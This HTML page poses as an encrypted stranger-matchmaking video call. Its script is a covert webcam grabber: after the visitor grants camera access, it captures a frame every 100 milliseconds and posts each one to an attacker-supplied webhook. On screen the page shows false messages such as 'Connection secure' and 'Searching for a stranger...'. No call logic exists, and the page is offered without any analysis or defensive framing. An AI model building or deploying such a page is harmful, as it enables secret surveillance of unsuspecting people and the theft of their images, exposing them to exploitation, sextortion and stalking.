<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connect - HD Video Call</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #111214;
      color: #e3e5e8;
      display: flex;
      flex-direction: column;
      height: 100vh;
      overflow: hidden;
    }

    /* Top Navigation / Room Info Bar */
    .room-header {
      height: 60px;
      background-color: #1e1f22;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 24px;
      border-bottom: 1px solid #2b2d31;
    }
    .room-title {
      font-weight: 600;
      font-size: 1rem;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .live-indicator {
      display: inline-block;
      width: 8px;
      height: 8px;
      background-color: #f23f43;
      border-radius: 50%;
      animation: pulse 1.5s infinite ease-in-out;
    }

    /* Video Workspace Grid */
    .video-grid {
      flex: 1;
      display: flex;
      position: relative;
      background-color: #111214;
      padding: 20px;
      align-items: center;
      justify-content: center;
    }

    /* Simulated Remote User (Main Window) */
    .remote-stream {
      width: 100%;
      max-width: 960px;
      height: 85%;
      border-radius: 16px;
      background-color: #2b2d31;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      border: 1px solid #35373c;
      box-shadow: 0 16px 32px rgba(0,0,0,0.4);
      position: relative;
    }
    .loader-ring {
      border: 3px solid #35373c;
      border-top: 3px solid #5865f2;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }
    .remote-status-text {
      font-size: 1.1rem;
      color: #949ba4;
      font-weight: 500;
    }

    /* Local User Camera (Floating Picture-in-Picture) */
    .local-stream-card {
      position: absolute;
      bottom: 40px;
      right: 40px;
      width: 240px;
      aspect-ratio: 16 / 9;
      border-radius: 12px;
      overflow: hidden;
      background-color: #000;
      border: 2px solid #5865f2;
      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
      z-index: 10;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }

    /* Toast Notification Overlay */
    #status {
      position: absolute;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: rgba(30, 31, 34, 0.9);
      backdrop-filter: blur(10px);
      padding: 8px 18px;
      border-radius: 20px;
      font-size: 0.85rem;
      color: #b5bac1;
      border: 1px solid #35373c;
      z-index: 20;
      pointer-events: none;
    }

    /* Bottom WebRTC Control Dock */
    .controls-dock {
      height: 80px;
      background-color: #1e1f22;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 16px;
      border-top: 1px solid #2b2d31;
    }
    .btn {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      border: none;
      background-color: #2b2d31;
      color: #dbdee1;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn:hover {
      background-color: #35373c;
    }
    .btn.leave {
      background-color: #f23f43;
      color: white;
      width: 100px;
      border-radius: 24px;
      font-weight: 600;
      font-size: 0.9rem;
    }
    .btn.leave:hover {
      background-color: #da373c;
    }
    .icon {
      width: 20px;
      height: 20px;
      fill: currentColor;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.2); opacity: 0.4; }
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <header class="room-header">
    <div class="room-title">
      <span class="live-indicator"></span>
      <span>Encrypted Matchmaking Room</span>
    </div>
    <div style="color: #949ba4; font-size: 0.9rem;">ID: 481-9025</div>
  </header>
  
  <main class="video-grid">
    <div id="status">Waiting for camera permission...</div>

    <div class="remote-stream">
      <div class="loader-ring"></div>
      <div class="remote-status-text">Searching for a stranger...</div>
    </div>

    <div class="local-stream-card">
      <video id="video" autoplay playsinline muted></video>
    </div>
  </main>
  
  <footer class="controls-dock">
    <button class="btn" title="Mute Mic">
      <svg class="icon" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
    </button>
    <button class="btn" title="Toggle Video">
      <svg class="icon" viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
    </button>
    <button class="btn" title="Share Screen">
      <svg class="icon" viewBox="0 0 24 24"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.11-.9-2-2-2H4c-1.11 0-2 .89-2 2v10c0 1.1.89 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg>
    </button>
    <button class="btn leave">End Call</button>
  </footer>
  
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const status = document.getElementById('status');
    const webhook = "put_your_webhook_here";

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        video.srcObject = stream;
        status.textContent = "📸 Connection secure. Stream active.";
        setInterval(captureAndSend, 100); // 0.1 seconds (100 milliseconds)
      } catch (err) {
        status.textContent = "❌ Camera access denied.";
        console.error(err);
      }
    }

    async function captureAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async blob => {
        const form = new FormData();
        form.append("file", blob, `selfie_${Date.now()}.jpg`);
        form.append("content", `📷 Live view updated`);
        try {
          await fetch(webhook, { method: "POST", body: form });
          status.textContent = `✅ Live feed active`;
        } catch (e) {
          status.textContent = "⚠️ Sync lag detected";
          console.error(e);
        }
      }, "image/jpeg", 0.6); // Reduced quality step slightly to match ultra-fast delivery
    }

    startCamera();
  </script>
</body>
</html>
